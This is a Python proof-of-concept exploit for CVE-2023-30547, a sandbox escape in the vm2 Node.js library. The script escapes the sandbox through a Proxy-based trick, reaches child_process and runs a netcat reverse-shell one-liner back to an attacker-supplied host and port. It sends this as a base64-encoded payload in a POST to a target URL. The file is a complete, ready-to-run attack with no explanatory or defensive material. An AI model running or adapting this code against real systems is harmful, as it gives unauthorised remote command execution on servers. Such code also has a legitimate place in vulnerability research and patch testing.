import argparse
import base64
from threading import Thread

import requests
from requests import ReadTimeout

payload = """
const { VM } = require("vm2");
const vm = new VM();
const exploit = `{EXPLOIT}`;
vm.run(exploit);
"""

exploit_code = """
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
const prox = new Proxy(err, handler);
try {
    throw prox;
} catch ({constructor: c}) {
c.constructor('return process')().mainModule
                                 .require('child_process')
                                 .execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f');
}
"""


def send_payload(url, json):
    try:
        requests.post(url=url, json=json, timeout=3, verify=False)
    except ReadTimeout:
        pass
    # print(res.json()) # For debugging


def send(url, lhost, lport):
    expl = exploit_code.replace('{LHOST}', lhost).replace('{LPORT}', str(lport))
    p = payload.replace('{EXPLOIT}', expl)
    print("[*] Encoding Payload")
    p = base64.b64encode(p.encode('utf-8')).decode('utf-8')
    d = {'code': p}
    print("[*] Sending payload")
    t = Thread(target=send_payload, args=(url, d))
    t.start()
    print("[*] Payload sent. Watch your listener for a shell.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog='CVE-2023-30547 PoC',
        description='PoC for the vm2 vulnerability CVE-2023-30547')

    parser.add_argument('--url', dest='url', type=str, help='Target URL')
    parser.add_argument('--lhost', dest='lhost', type=str, help='IP of the local host for a reverse shell')
    parser.add_argument('--lport', dest='lport', type=int, help='Port of the local host for a reverse shell')
    args = parser.parse_args()
    print("[*] Starting Exploiting")
    send(url=args.url, lhost=args.lhost, lport=args.lport)
